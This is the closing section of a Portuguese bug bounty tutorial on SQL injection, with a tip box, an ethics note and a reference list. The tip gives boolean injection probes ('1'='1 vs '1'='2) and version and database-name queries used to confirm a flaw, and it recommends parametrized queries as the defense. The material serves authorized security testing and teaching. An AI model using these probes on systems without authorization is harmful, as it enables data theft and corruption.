> 💡 **Dica de ouro:** se uma **aspa** quebra a página e `'1'='1` vs `'1'='2` mudam a resposta, você tem SQLi — pare de adivinhar e **prove** com `database()`/`@@version`. E na hora de defender: se a string da sua query **muda** conforme o input do usuário, você está concatenando errado. Query parametrizada é uma string **fixa** com valores ao lado.

## Nota ética

Tudo aqui é para **testes autorizados** — bug bounty dentro do escopo, pentests contratados e labs legais. SQLi é especialmente perigoso porque um payload mal calibrado (ou o `sqlmap` agressivo) pode **corromper ou apagar dados reais** de usuários. Em alvo de produção: prove a leitura de **metadados** (versão, nome do banco) e **pare** — não dumpe PII, não escreva, não delete. Injetar SQL em sistema de terceiros sem autorização é crime, e desnecessário quando há tanto lab bom pra treinar. Use pra proteger, reportar com responsabilidade e ensinar.

## Referências

- [OWASP A03:2021 — Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [OWASP — SQL Injection (attack)](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP — SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger — SQL injection](https://portswigger.net/web-security/sql-injection) · [Blind SQLi](https://portswigger.net/web-security/sql-injection/blind) · [Cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PortSwigger — NoSQL injection](https://portswigger.net/web-security/nosql-injection) · [OWASP WSTG — Testing for NoSQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
- [PayloadsAllTheThings — SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [sqlmap — Usage (doc oficial)](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
- [reddelexc/hackerone-reports — Top SQLi reports](https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPSQLI.md)

---
*Próximo/relacionado na série: [Security Misconfiguration e Caça a CVEs/1-day](/posts/security-misconfiguration-cve-hunting/) · base: [Recon & Discovery](/posts/recon-discovery/) · reportar: [Como escrever um report que paga](/posts/como-escrever-report-que-paga/)*

---

*📚 Parte do **[Guia Completo de Bug Bounty](/posts/guia-bug-bounty/)** — o índice da série, do básico ao avançado.*
